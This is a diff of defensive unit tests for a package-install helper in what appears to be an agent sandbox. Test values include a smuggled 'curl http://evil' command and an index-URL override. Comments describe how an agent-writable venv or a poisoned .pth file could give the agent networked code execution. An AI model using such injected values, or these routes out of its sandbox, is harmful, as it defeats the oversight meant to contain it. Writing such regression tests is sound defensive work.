@@ -58,6 +58,15 @@ def test_validate_packages_rejects_flag_injection():
         _h.validate_packages(["--index-url=http://evil"])
 
 
+@pytest.mark.parametrize("bad", ["-e", "--pre", "--no-deps", ".", "-", "foo.", ".foo", "-foo"])
+def test_validate_packages_rejects_option_flags_and_local_build(bad):
+    # Regression for the /install flag-injection hole: the old regex accepted a
+    # leading `-` and a bare `.`, so `install(['-e', '.'])` built the agent's
+    # own setup.py WITH network. Names must be alphanumeric-bookended.
+    with pytest.raises(ValueError):
+        _h.validate_packages([bad])
+
+
 def test_validate_packages_rejects_space_smuggling():
     with pytest.raises(ValueError):
         _h.validate_packages(["rich; curl http://evil"])
@@ -75,8 +84,28 @@ def test_validate_packages_rejects_empty_list():
 def test_build_install_command_bootstraps_venv_then_installs():
     cmd = _h.build_install_command("leetcode-coach", ["rich", "numpy==2.0.0"])
     ws = "/claub/workspaces/leetcode-coach"
+    site = f"{ws}/.venv/lib/python3.12/site-packages"
     assert f"uv venv --system-site-packages {ws}/.venv" in cmd
-    assert cmd.endswith(f"uv pip install --python {ws}/.venv/bin/python rich numpy==2.0.0")
+    # Installs with the TRUSTED system interpreter into the venv's site-packages
+    # via --target — NOT by executing the agent-writable venv python.
+    assert cmd.endswith(
+        f"uv pip install --python {_h.SYSTEM_PYTHON} --target {site} -- rich numpy==2.0.0"
+    )
+
+
+def test_build_install_command_never_executes_venv_python():
+    # The venv python and its site-packages are agent-writable; executing them
+    # on the networked path is the second /install RCE (a poisoned .pth or a
+    # hijacked interpreter runs with network). The install must run the
+    # read-only system interpreter instead.
+    cmd = _h.build_install_command("leetcode-coach", ["rich"])
+    assert "/.venv/bin/python" not in cmd.split("uv pip install", 1)[1]
+    assert _h.SYSTEM_PYTHON in cmd
+
+
+def test_build_install_command_uses_dash_dash_separator():
+    cmd = _h.build_install_command("leetcode-coach", ["rich"])
+    assert " -- rich" in cmd
 
 
 def test_build_install_command_validates_names():
